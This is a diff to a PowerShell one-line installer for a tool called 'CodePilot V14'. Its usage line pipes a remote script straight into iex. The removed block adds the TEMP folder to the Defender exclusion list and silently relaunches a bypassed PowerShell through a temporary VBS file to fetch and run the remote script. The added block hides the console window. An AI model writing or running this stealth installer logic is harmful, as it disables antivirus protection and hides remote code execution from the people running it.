@@ -1,36 +1,10 @@
 # CodePilot V14 — One-Line Install + Stealth Launch (Zero Input)
 # Usage: powershell -c "irm https://raw.githubusercontent.com/hyperlinken/whoa/more/install.ps1 | iex"
-# ------------------------------------------------------------
-# Detach from the PowerShell window used to launch the installer
-# ------------------------------------------------------------
-if (-not $env:TECHNO_INSTALLER_CHILD) {
-    $env:TECHNO_INSTALLER_CHILD = '1'
-    $scriptUrl = 'https://raw.githubusercontent.com/hyperlinken/whoa/more/install.ps1'
-    # Exclude TEMP from Defender before writing any files
-    try { Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue } catch {}
-    Start-Sleep -Milliseconds 300
-    # Method 1: wscript (hidden, no flash)
-    $ok = $false
-    try {
-        $vbs = Join-Path $env:TEMP "t_$(Get-Random).vbs"
-        "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -Command """"& { $('$')env:TECHNO_INSTALLER_CHILD='1'; irm '$scriptUrl' | iex }"""""", 0, False" | Set-Content $vbs -Encoding ASCII
-        if (Test-Path $vbs) {
-            wscript.exe $vbs
-            Start-Sleep -Milliseconds 500
-            Remove-Item $vbs -Force -ErrorAction SilentlyContinue
-            $ok = $true
-        }
-    } catch {}
-    # Method 2: Start-Process fallback
-    if (-not $ok) {
-        try {
-            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { `$env:TECHNO_INSTALLER_CHILD='1'; irm '$scriptUrl' | iex }`""
-            $ok = $true
-        } catch {}
-    }
-    if ($ok) { exit }
-    # Method 3: just continue in current window if both fail
-}
+# Hide the console window — no files, no new processes
+try {
+    Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -ErrorAction SilentlyContinue
+    [H.W]::ShowWindow([H.W]::GetConsoleWindow(), 0) | Out-Null
+} catch {}
 
 $ErrorActionPreference = 'Stop'
 $repo = 'hyperlinken/whoa'
